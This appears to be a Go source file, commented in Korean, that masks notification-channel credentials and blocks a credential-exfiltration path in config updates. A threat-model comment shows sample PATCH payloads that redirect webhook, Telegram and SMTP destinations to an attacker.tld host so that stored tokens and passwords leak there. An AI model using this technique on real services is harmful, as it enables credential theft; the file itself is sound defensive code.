package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix는 마스킹된 값의 표시 접두사입니다. API가 자격 증명을 반환할 때 이 접두사가 붙은 값으로 실제 내용을 대체하며,
// 업데이트 API에서 이 접두사가 붙은 값을 받으면 "DB의 기존 값을 그대로 유지"하는 것으로 해석합니다.
//
// 빈 문자열이나 고정 상수 대신 접두사를 사용하는 이유는 식별 가능한 정보를 조금 덧붙여
// (MaskedValue 참조), 키를 다시 붙여넣지 않고도 사용자가 "어떤 봇인지" 구분할 수 있게 하기 위함입니다.
const MaskedPrefix = "__masked__"

// MaskedValue는 마스킹된 값을 생성합니다.
//
//	"__masked__"              원래 값이 너무 짧으면 힌트를 제공하지 않음
//	"__masked__:…ab12cd"      원래 값의 마지막 6자리를 식별 힌트로 포함
//
// 마지막 6자리만 노출하는 것은 의도적인 선택입니다. Webhook 주소의 식별 정보는 끝부분에 있고(WeCom(기업용 위챗)의 key,
// Feishu의 봇 id 등), 앞부분은 모든 봇이 동일해 식별 가치가 없습니다. 마지막 6자리로는
// 자격 증명을 복원할 수 없지만, 설정하는 사람이 "내 그룹인지" 알아보기에는 충분합니다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked는 값이 마스킹된 값인지 반환합니다(즉, API 응답 후 수정되지 않음).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig는 설정의 복사본을 반환하며, 채널의 자격 증명 필드를 마스킹된 값으로 대체합니다.
//
// 알 수 없는 채널 유형은 기존 설정 대신 빈 map을 반환합니다. UI에 "설정 사용 불가"가 표시되더라도,
// 채널 유형을 식별할 수 없을 때 자격 증명이 포함될 수 있는 원래 내용 전체를 반환해서는 안 됩니다.
// 자격 증명이 아닌 필드는 그대로 유지하여 UI에서 정상적으로 표시할 수 있게 합니다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers와 같은 중첩 구조는 전체를 하나의 자격 증명으로 처리합니다. 하위 키를 각각 판정하려면 채널마다
		// "어떤 하위 키가 자격 증명인지" 규칙을 다시 선언해야 하므로 복잡도에 비해 이점이 적습니다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials는 "대상 주소가 바뀌었지만 호출자가 자격 증명 필드에 대해
// 의사를 명시하지 않음"을 나타냅니다. 조용히 허용하거나 자격 증명을 버리는 대신 반환하는 이유는 PrepareConfigUpdate를 참조하세요.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 변경된 대상 키
	Missing []string // 의사를 명시하지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 변경되었습니다. 자격 증명 필드도 다시 입력하세요(" +
		strings.Join(e.Missing, ", ") + "): 새 값을 입력하거나, 자격 증명이 더 이상 필요하지 않다면 명시적으로 비워 두세요." +
		"기존 자격 증명은 이전 주소에만 유효하며, 계속 사용하면 새 주소에 전달하는 것과 같습니다."
}

// PrepareConfigUpdate는 채널 설정을 병합하며, 보안에 민감한 "대상 주소 변경"을 처리합니다.
//
// 채널 업데이트 경로에서 단순한 MergeConfig 대신 사용하며, 실제로 가능한 다음 경로를 해결합니다.
// 대상 주소(메시지를 보내는 곳)와 자격 증명(어떤 신원으로 보내는지)은 독립된 두 필드이며, MergeConfig는
// "언급하지 않은 키"에 대해 항상 DB의 기존 값을 유지합니다. 따라서 채널을 PATCH할 수 있는 누구나 **주소만 바꾸고,
// 자격 증명을 언급하지 않으면** 서버가 DB의 실제 자격 증명을 자신이 제어하는 엔드포인트로 보내게 할 수 있습니다.
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 기존 Authorization 헤더를 요청과 함께 외부로 전송
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<真Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 후 사용자 이름과 비밀번호 전달
//
// 이 경로는 완전히 조용히 발생하며 리디렉션에 의존하지 않으므로(다른 호스트로의 이동 거부로 막을 수 없음),
// "자격 증명을 브라우저에 반환하지 않는다"는 이 패키지의 마스킹 목적을 직접 무너뜨립니다.
//
// 규칙: 대상 키 중 하나라도 새 값으로 바뀌면 호출자는 **모든** 자격 증명 키에 대해 의사를 명시해야 합니다.
//   - 새 값 제공 → 새 값 사용
//   - 빈 문자열 명시적 전달 → 해당 필드에 자격 증명이 더 이상 필요하지 않음(비우기 의미 유지)
//   - 마스킹된 값을 그대로 반환 / 해당 키를 아예 언급하지 않음 → 거부
//
// 세 번째도 거부하는 이유는 "마스킹된 값"이 바로 "기존 자격 증명 사용"을 뜻하고, 기존 자격 증명은
// 이전 주소에만 유효하기 때문입니다. "자격 증명 자동 삭제"는 의도적으로 하지 않습니다. 선택적인 자격 증명 필드
// (webhook의 headers, email의 password)에서는 조용히 "인증·인가 확인은 없어졌지만 API는 200 반환"으로 바뀌어,
// 오류보다 원인 파악이 어려워지기 때문입니다. 동작을 수행하는 사람이 한 번 더 입력하도록 하는 편이 낫습니다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("채널 유형 %q: 등록되지 않았습니다", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값(webhook의 headers 객체 등)에 마스킹 리터럴이 포함되면,
	// 호출자가 '기존 값 유지' 센티널 값을 구조체 내부에 넣었다는 뜻입니다. MergeConfig는 '문자열이며
	// 접두사가 있음'만 마스킹으로 인식하므로, 이 형태는 일반 객체로 저장됩니다. DB에 실제로 리터럴
	// "__masked__"가 저장되어 이후 인증·인가 확인이 오류를 알리지 않고 작동하지 않게 됩니다. 차라리 거부해야 합니다.
	//
	// 이 검사는 반드시 **가장 먼저** 해야 합니다. 주소가 그대로면 조기 반환하므로, 뒤에 두면
	// "주소 변경" 경로만 검사하게 됩니다(첫 버전에서 위치를 잘못 두었으며 테스트가 바로 발견했음).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 바뀐 대상 키를 찾습니다. 마스킹된 값은 "변경 없음"을 뜻합니다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 그대로면 일반 병합을 합니다(마스킹된 값은 기존 값 유지, 빈 문자열은 비우기, 나머지는 덮어쓰기).
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌면 모든 자격 증명 키에 대해 의사를 명시하도록 요구합니다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers는 마스킹 센티널 값을 문자열이 아닌 구조 내부에 넣어 제출하는 것을 거부합니다.
//
// 마스킹 메커니즘의 전제는 '전체 값이 문자열'이라는 것입니다. webhook의 headers 같은 객체 필드는
// 전체를 마스킹(문자열 "__masked__"로 작성)하거나 전체를 제출해야 합니다. 객체 내부에 센티널 값을 넣으면
// '변경하지 않음'을 표현할 수도 없고, 실제 값으로 DB에 저장됩니다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("필드 %s 내용에 마스킹 표시 %q 포함: 이 필드는 전체를 비워 두어 기존 값을 사용하거나 전체에 새 값을 제출해야 하며, 구조체 내부에 마스킹 자리표시자를 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue는 두 설정값이 같은지 비교합니다. JSON 직렬화 비교로 타입 차이도 함께 처리하며,
// 프런트에서 제출한 포트는 number, DB에서 읽은 값은 float64일 수 있어 직접 ==로 비교하면 잘못 판정할 수 있습니다.
//
// "비어 있음"은 비교 전에 정규화해야 합니다. 이 설정 모델에서 빈 문자열과 "키 없음"은 같은 상태이며,
// MergeConfig가 빈 문자열을 명시적인 비우기로 보고 키를 바로 delete하기 때문입니다. 정규화하지 않으면,
// 항상 비워 두는 선택적 대상 필드(Telegram의 base_url이 유일한 필드이며, 비워 두면
// 공식 주소 사용)가 다음 경로를 거칩니다.
//
//	새로 만들 때 base_url:"" 저장  →  첫 저장에서 MergeConfig가 키 삭제
//	→ 두 번째 저장 시 incoming은 "", stored에는 키가 없어 "주소 변경"으로 판정
//	→ 자격 증명은 마스킹된 값 → 400 "대상 주소가 변경되었습니다. 자격 증명 필드도 다시 입력하세요"
//
// 그 후 Bot Token을 다시 붙여넣지 않으면 매번 저장에 실패하지만, 사용자는 아무것도 바꾸지 않았습니다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue는 설정값이 "비어 있는지" 판정합니다.
// 기준은 MergeConfig의 비우기 판정(strings.TrimSpace(s) == "")과 일치해야 하며,
// 그렇지 않으면 "MergeConfig는 삭제 대상으로, sameConfigValue는 값이 있다고 보는" 차이가 생깁니다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig는 incoming을 stored에 병합하여 채널 설정 업데이트에 사용합니다.
//
// 규칙:
//   - incoming에서 값이 마스킹된 키 → stored의 기존 값 유지(사용자가 이 필드를 수정하지 않음)
//   - incoming에서 값이 빈 문자열인 키 → 명시적인 비우기로 보고 키 삭제
//   - 그 밖의 키 → incoming 값으로 덮어쓰기
//   - stored에 있지만 incoming에 없는 키 → 유지(부분 업데이트 의미)
//
// 빈 문자열을 "비우기"로 보는지 명확해야 합니다. 프런트 폼은 입력하지 않은 필드를 빈 문자열로 제출하며,
// 이를 유효한 값으로 저장하면 "비워 두어 기존 값 유지"인 필드를 실제로 비우게 됩니다.
// 여기서는 명시적인 비우기를 선택합니다. 잘못 설정한 필드를 지우려는 사용자에게 다른 표현 방식이 없기 때문입니다.
// (필드를 빼면 "제공하지 않음"과 "빈 값 제공"을 구분할 수 있지만, UI는 이 차이를 사용하지 않음).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스킹된 값 = 수정하지 않음, stored 유지
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
